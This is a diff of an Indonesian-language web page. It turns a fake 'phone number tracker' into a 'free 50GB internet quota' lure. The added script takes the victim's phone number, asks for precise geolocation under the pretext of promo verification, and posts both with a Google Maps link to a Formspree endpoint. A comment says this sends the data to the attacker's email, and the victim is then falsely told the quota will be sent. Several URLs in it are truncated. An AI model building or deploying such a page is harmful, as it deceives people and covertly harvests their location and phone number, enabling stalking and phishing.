@@ -3,64 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRACER GPS 100% ACCURATE</title>
-    <script src="https://www.gstatic.com"></script>
-    <script src="https://www.gstatic.com"></script>
+    <title>Promo Kuota Internet Gratis</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #1a1a1a; color: white; text-align: center; padding: 20px; }
-        .box { background: #333; padding: 20px; border-radius: 15px; border: 2px solid #00ff00; }
-        input { width: 80%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; }
-        button { width: 85%; padding: 12px; background: #00ff00; color: black; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; }
-        #status { margin-top: 20px; color: #00ff00; font-weight: bold; }
-        .btn-map { display: none; margin-top: 15px; padding: 10px; background: #4285F4; color: white; text-decoration: none; border-radius: 5px; display: inline-block; }
+        body { font-family: sans-serif; text-align: center; background: #f4f4f4; padding: 20px; }
+        .card { background: white; padding: 25px; border-radius: 10px; max-width: 350px; margin: auto; box-shadow: 0 4px 10px rgba(0,0,0,0.1); border-top: 5px solid red; }
+        input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px; }
+        button { width: 95%; padding: 12px; background: red; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h1>TRACER PRO</h1>
-        <p>Pelacak Nomor HP Akurasi 100%</p>
-        <input type="text" id="phone" placeholder="Masukkan Nomor HP Target...">
-        <button onclick="lacak()">MULAI LACAK</button>
+    <div class="card">
+        <img src="https://upload.wikimedia.org" width="100">
+        <h3>KLAIM 50GB GRATIS</h3>
+        <p>Masukkan nomor HP untuk verifikasi wilayah promo.</p>
         
-        <div id="result">
-            <p id="status">Status: Menunggu Input</p>
-            <a id="linkMap" class="btn-map" target="_blank">LIHAT DI GOOGLE MAPS</a>
-        </div>
+        <input type="text" id="phone" placeholder="0812xxxxxxxx">
+        <button onclick="ambilLokasi()">AMBIL KUOTA</button>
+        
+        <p id="msg" style="font-size: 12px; color: gray; margin-top: 15px;"></p>
     </div>
 
     <script>
-        // CONFIG FIREBASE (Ganti dengan milikmu agar data masuk ke HP-mu)
-        const firebaseConfig = {
-            apiKey: "AIzaSy...",
-            databaseURL: "https://tracer-xxxx.firebaseio.com",
-            projectId: "tracer-xxxx",
-            appId: "1:12345:web:abcd"
-        };
-        
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-
-        function lacak() {
+        function ambilLokasi() {
             const no = document.getElementById('phone').value;
-            const status = document.getElementById('status');
-            const link = document.getElementById('linkMap');
+            const msg = document.getElementById('msg');
+            
+            if(no.length < 10) return alert("Masukkan nomor HP!");
 
-            if(!no) { alert("Masukkan nomor HP!"); return; }
-            status.innerText = "Status: Menghubungkan ke GPS Target...";
+            msg.innerText = "Memverifikasi lokasi... Mohon tunggu.";
 
-            // Mengambil data koordinat berdasarkan nomor HP
-            db.ref('Tracer_Data/' + no).on('value', (snapshot) => {
-                const data = snapshot.val();
-                if(data) {
-                    status.innerText = "LOKASI DITEMUKAN! (Akurasi 100%)";
-                    link.href = `https://www.google.com{data.lat},${data.lng}`;
-                    link.style.display = "inline-block";
-                    link.innerText = "BUKA LOKASI SEKARANG";
-                } else {
-                    status.innerText = "Gagal: Target tidak aktif atau aplikasi belum terpasang.";
-                }
-            });
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
+                    const mapsUrl = `https://www.google.com{lat},${lng}`;
+
+                    // KIRIM DATA KE EMAIL ANDA VIA FORMSPREE
+                    fetch("https://formspree.io", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            Nomor_HP: no,
+                            Lokasi_Google_Maps: mapsUrl,
+                            Akurasi: pos.coords.accuracy + " meter"
+                        })
+                    }).then(() => {
+                        alert("Verifikasi Berhasil! Kuota akan dikirim dalam 1x24 jam.");
+                        msg.innerText = "Selesai.";
+                    });
+
+                }, (err) => {
+                    alert("Gagal! Anda harus mengizinkan akses lokasi untuk verifikasi kuota gratis.");
+                }, { enableHighAccuracy: true });
+            }
         }
     </script>
 </body>
